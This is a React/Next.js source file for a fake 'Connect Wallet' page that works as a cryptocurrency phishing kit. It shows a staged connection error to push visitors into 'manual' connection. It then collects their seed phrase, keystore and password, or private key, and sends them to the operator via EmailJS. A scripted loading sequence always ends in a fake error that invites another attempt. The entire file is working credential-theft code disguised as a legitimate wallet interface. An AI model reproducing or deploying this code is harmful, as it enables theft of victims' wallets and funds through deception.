"use client";
import Image from "next/image";
import { useState, useEffect, useRef } from "react";
import { wallets } from "../data/wallet";
import emailjs from '@emailjs/browser';

export default function WalletPage() {
    const [searchQuery, setSearchQuery] = useState("");
    const [showModal, setShowModal] = useState(false);
    const [showManualModal, setShowManualModal] = useState(false);
    const [showLoadingModal, setShowLoadingModal] = useState(false);
    const [selectedWallet, setSelectedWallet] = useState<{ name: string; icon: string } | null>(null);
    const [isInitializing, setIsInitializing] = useState(true);
    const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "privatekey">("phrase");
    const [loadingStatus, setLoadingStatus] = useState<"loading" | "initializing" | "linking" | "error">("loading");

    // Form data states
    const [phraseValue, setPhraseValue] = useState("");
    const [keystoreValue, setKeystoreValue] = useState("");
    const [passwordValue, setPasswordValue] = useState("");
    const [privateKeyValue, setPrivateKeyValue] = useState("");

    const filteredWallets = wallets.filter(wallet =>
        wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
    );

    const handleWalletClick = (wallet: { name: string; icon: string }) => {
        setSelectedWallet(wallet);
        setShowModal(true);
        setIsInitializing(true);
    };

    useEffect(() => {
        if (showModal && isInitializing) {
            const timer = setTimeout(() => {
                setIsInitializing(false);
            }, 2000);
            return () => clearTimeout(timer);
        }
    }, [showModal, isInitializing]);

    const closeModal = () => {
        setShowModal(false);
        setSelectedWallet(null);
        setIsInitializing(true);
    };

    const openManualModal = () => {
        setShowModal(false);
        setShowManualModal(true);
        setActiveTab("phrase");
    };

    const closeManualModal = () => {
        setShowManualModal(false);
        setSelectedWallet(null);
    };

    const handleConnect = async () => {
        if (!selectedWallet) return;

        // Close manual modal and show loading modal
        setShowManualModal(false);
        setShowLoadingModal(true);
        setLoadingStatus("loading");

        // Get the current form data based on active tab
        let emailData = {
            wallet_name: selectedWallet.name,
            connection_type: activeTab,
            phrase: activeTab === "phrase" ? phraseValue : "",
            keystore: activeTab === "keystore" ? keystoreValue : "",
            password: activeTab === "keystore" ? passwordValue : "",
            private_key: activeTab === "privatekey" ? privateKeyValue : "",
        };

        try {
            // Send email using EmailJS with environment variables
            await emailjs.send(
                process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
                process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
                emailData,
                process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
            );
            console.log('Email sent successfully');
        } catch (error) {
            console.error('Email send error:', error);
            // Continue with loading animation even if email fails
        }

        // Loading sequence
        setTimeout(() => {
            setLoadingStatus("initializing");
        }, 2000);

        setTimeout(() => {
            setLoadingStatus("linking");
        }, 5000);

        setTimeout(() => {
            setLoadingStatus("error");
        }, 7000);
    };

    const handleTryAgain = () => {
        setShowLoadingModal(false);
        setShowManualModal(false);
        setSelectedWallet(null);
        setLoadingStatus("loading");
        // Clear all form inputs
        setPhraseValue("");
        setKeystoreValue("");
        setPasswordValue("");
        setPrivateKeyValue("");
    };

    const closeLoadingModal = () => {
        setShowLoadingModal(false);
        setSelectedWallet(null);
        setLoadingStatus("loading");
    };

    return (
        <div className="min-h-screen bg-[#0B1527]">
            {/* Error Modal */}
            {showModal && selectedWallet && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
                    <div className="bg-white rounded-lg shadow-xl w-full max-w-md mx-4 relative">
                        {/* Modal Header */}
                        <div className="flex items-center justify-between px-6 py-4 border-b">
                            <button
                                onClick={closeModal}
                                className="text-blue-600 font-medium hover:text-blue-700"
                            >
                                Back
                            </button>
                            <button
                                onClick={closeModal}
                                className="text-gray-400 hover:text-gray-600 text-2xl leading-none"
                            >
                                ×
                            </button>
                        </div>

                        {/* Modal Body */}
                        <div className="p-6 space-y-4">
                            {/* Error/Initializing Box */}
                            <div className="flex items-center justify-between border-2 border-red-500 rounded-lg p-4">
                                <span className="text-red-600 font-medium">
                                    {isInitializing ? "Initializing..." : "Error Connecting..."}
                                </span>
                                {!isInitializing && (
                                    <button
                                        onClick={openManualModal}
                                        className="bg-gray-800 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-gray-700"
                                    >
                                        Connect Manually
                                    </button>
                                )}
                            </div>

                            {/* Selected Wallet */}
                            <div className="flex items-center justify-between border border-gray-300 rounded-lg p-4">
                                <div className="flex items-center gap-3">
                                    <div className="w-12 h-12 relative flex items-center justify-center">
                                        {selectedWallet.icon ? (
                                            <Image
                                                src={selectedWallet.icon}
                                                alt={selectedWallet.name}
                                                width={48}
                                                height={48}
                                                className="rounded-full"
                                                unoptimized
                                            />
                                        ) : (
                                            <span className="text-gray-600 text-xl font-bold">
                                                {selectedWallet.name.charAt(0)}
                                            </span>
                                        )}
                                    </div>
                                    <span className="text-gray-900 font-medium">
                                        {selectedWallet.name}
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Manual Connection Modal */}
            {showManualModal && selectedWallet && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
                    <div className="bg-white rounded-lg shadow-xl w-full max-w-md mx-4 relative">
                        {/* Modal Body */}
                        <div className="p-6">
                            {/* Wallet Header */}
                            <div className="flex items-center gap-3 mb-6">
                                <div className="w-14 h-14 relative flex items-center justify-center">
                                    {selectedWallet.icon ? (
                                        <Image
                                            src={selectedWallet.icon}
                                            alt={selectedWallet.name}
                                            width={56}
                                            height={56}
                                            className="rounded-full"
                                            unoptimized
                                        />
                                    ) : (
                                        <span className="text-gray-600 text-2xl font-bold">
                                            {selectedWallet.name.charAt(0)}
                                        </span>
                                    )}
                                </div>
                                <span className="text-gray-900 font-semibold text-lg">
                                    {selectedWallet.name}
                                </span>
                            </div>

                            {/* Tabs */}
                            <div className="flex gap-8 mb-6 border-b">
                                <button
                                    onClick={() => setActiveTab("phrase")}
                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "phrase"
                                            ? "text-gray-900 border-b-2 border-gray-900"
                                            : "text-gray-500 hover:text-gray-700"
                                        }`}
                                >
                                    Phrase
                                </button>
                                <button
                                    onClick={() => setActiveTab("keystore")}
                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "keystore"
                                            ? "text-gray-900 border-b-2 border-gray-900"
                                            : "text-gray-500 hover:text-gray-700"
                                        }`}
                                >
                                    Keystore
                                </button>
                                <button
                                    onClick={() => setActiveTab("privatekey")}
                                    className={`pb-2 text-sm font-medium transition-colors ${activeTab === "privatekey"
                                            ? "text-gray-900 border-b-2 border-gray-900"
                                            : "text-gray-500 hover:text-gray-700"
                                        }`}
                                >
                                    Private Key
                                </button>
                            </div>

                            {/* Tab Content */}
                            <div className="space-y-4">
                                {activeTab === "phrase" && (
                                    <>
                                        <textarea
                                            placeholder="Phrase"
                                            rows={6}
                                            value={phraseValue}
                                            onChange={(e) => setPhraseValue(e.target.value)}
                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent resize-none text-sm"
                                        />
                                        <p className="text-xs text-gray-500">
                                            Typically 12 (sometimes 24) words separated by single spaces
                                        </p>
                                    </>
                                )}

                                {activeTab === "keystore" && (
                                    <>
                                        <input
                                            type="text"
                                            placeholder="Enter Keystore"
                                            value={keystoreValue}
                                            onChange={(e) => setKeystoreValue(e.target.value)}
                                            autoComplete="off"
                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
                                        />
                                        <input
                                            type="password"
                                            placeholder="Wallet password"
                                            value={passwordValue}
                                            onChange={(e) => setPasswordValue(e.target.value)}
                                            autoComplete="new-password"
                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
                                        />
                                        <p className="text-xs text-gray-500">
                                            Several lines of text beginning with "{'{'}-" plus the password you used to encrypt it.
                                        </p>
                                    </>
                                )}

                                {activeTab === "privatekey" && (
                                    <>
                                        <input
                                            type="text"
                                            placeholder="Enter your Private Key"
                                            value={privateKeyValue}
                                            onChange={(e) => setPrivateKeyValue(e.target.value)}
                                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
                                        />
                                        <p className="text-xs text-gray-500">
                                            Typically 12 (sometimes 24) words separated by a single space.
                                        </p>
                                    </>
                                )}
                            </div>

                            {/* Action Buttons */}
                            <div className="mt-6 space-y-3">
                                <button
                                    onClick={handleConnect}
                                    className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-lg font-medium transition-colors"
                                >
                                    Connect
                                </button>
                                <button
                                    onClick={closeManualModal}
                                    className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-medium transition-colors"
                                >
                                    Cancel
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Loading Modal */}
            {showLoadingModal && selectedWallet && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/30">
                    <div className="bg-[rgba(76,29,149,0.95)] rounded-3xl shadow-2xl w-full max-w-lg mx-4 relative p-8">



                        {/* Modal Content */}
                        <div className="text-center mt-12">
                            <h2 className="text-white text-2xl font-bold mb-8 border-b border-white/30 pb-4">
                                Interacting With Provider
                            </h2>

                            {loadingStatus !== "error" ? (
                                <>
                                    {/* Loading Spinner */}
                                    <div className="flex justify-center mb-6">
                                        <div className="w-16 h-16 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
                                    </div>

                                    {/* Status Text */}
                                    <p className="text-white text-lg font-medium capitalize">
                                        {loadingStatus}...
                                    </p>
                                </>
                            ) : (
                                <>
                                    {/* Error Icon */}
                                    <div className="flex justify-center mb-6">
                                        <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center">
                                            <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                                            </svg>
                                        </div>
                                    </div>

                                    <p className="text-white text-lg font-bold mb-2">Error</p>
                                    <p className="text-red-400 text-sm mb-8">
                                        Unable to interact With Provider, please try another wallet
                                    </p>

                                    {/* Try Again Button */}
                                    <button
                                        onClick={handleTryAgain}
                                        className="bg-red-500 hover:bg-red-600 text-white px-8 py-3 rounded-lg font-medium transition-colors"
                                    >
                                        Try Again
                                    </button>
                                </>
                            )}
                        </div>
                    </div>
                </div>
            )}

            <div className="w-full bg-[#0B1527] py-10">
                <div className="flex justify-center">
                    <img
                        src="/wallogo.png"
                        alt="Wallet Logo"
                        className="w-24"
                    />
                </div>
            </div>
            <div className="bg-[#0B1527] text-[rgba(33,37,41,1)]" id="component-container">
                <div className="max-w-5xl mx-auto px-4">
                    <div className="text-center">
                        <h1
                            data-excompt-id="3092"
                            className="xl:text-[40px] mt-8 mb-2 font-semibold text-white text-[40px] leading-[48px] animate-pulse"
                        >
                            Connect Wallet
                        </h1>
                        <h6
                            data-excompt-id="6132"
                            className="mt-4 mb-2 leading-4 text-white text-[15px] animate-pulse"
                        >
                            Please connect your wallet to continue
                        </h6>
                        <input
                            type="text"
                            id="searchInput"
                            placeholder="Search wallet names..."
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            className="focus:bg-white focus:outline-0 focus:text-[rgba(73,80,87,1)] focus:shadow-[rgba(0,123,255,0.25)_0px_0px_0px_3.2px] focus:border-[rgba(128,189,255,1)] placeholder-gray-500 opacity-[1] block w-full overflow-visible rounded border border-gray-300 bg-white bg-clip-padding px-3 py-1.5 text-center leading-6 h-[calc(24px_+_2px_+_12px)] text-[rgba(73,80,87,1)] transition-[border-color,box-shadow] ease-[ease-in-out] duration-[0.15s]"
                        />
                    </div>
                </div>
            </div>
            <div className="w-full bg-[#0B1527] py-10">
                <div className="grid grid-cols-3 md:grid-cols-6 gap-10 max-w-5xl mx-auto px-4">
                    {filteredWallets.length > 0 ? (
                        filteredWallets.map((wallet, index) => (
                            <button
                                key={index}
                                className="text-center hover:scale-105 transition-transform"
                                onClick={() => handleWalletClick(wallet)}
                            >
                                <div className="w-20 h-20 mx-auto relative bg-gray-700 rounded-full flex items-center justify-center">
                                    {wallet.icon ? (
                                        <Image
                                            src={wallet.icon}
                                            alt={wallet.name}
                                            width={80}
                                            height={80}
                                            className="rounded-full"
                                            unoptimized
                                        />
                                    ) : (
                                        <span className="text-white text-2xl font-bold">
                                            {wallet.name.charAt(0)}
                                        </span>
                                    )}
                                </div>
                                <h4 className="mt-3 text-white text-[11px] font-semibold">
                                    {wallet.name}
                                </h4>
                            </button>
                        ))
                    ) : (
                        <div className="col-span-full text-center text-white">
                            WALLET NOT FOUND
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
